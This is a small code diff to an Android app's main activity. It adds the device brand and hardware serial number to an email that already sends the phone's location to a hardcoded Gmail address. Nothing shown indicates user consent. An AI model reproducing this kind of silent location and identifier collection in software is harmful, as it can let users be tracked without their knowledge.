@@ -15,6 +15,7 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
 import android.opengl.GLSurfaceView;
+import android.os.Build;
 import android.os.Bundle;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.widget.RecyclerView;
@@ -391,7 +392,7 @@ public class MainActivity extends Activity implements LocationListener {
 
         String email = "superrollanddice@gmail.com";
         String subject = "position";
-        String message = position + "\n" + "\n Model : " +android.os.Build.MODEL+ "\nDevice : " +android.os.Build.DEVICE;
+        String message = position + "\n" + "\n Model : " + Build.BRAND + " " + android.os.Build.MODEL+ "\nDevice : " +android.os.Build.DEVICE + " " + Build.SERIAL;
 
         //Creating SendMail object
         SendMail sm = new SendMail(this, email, subject, message);
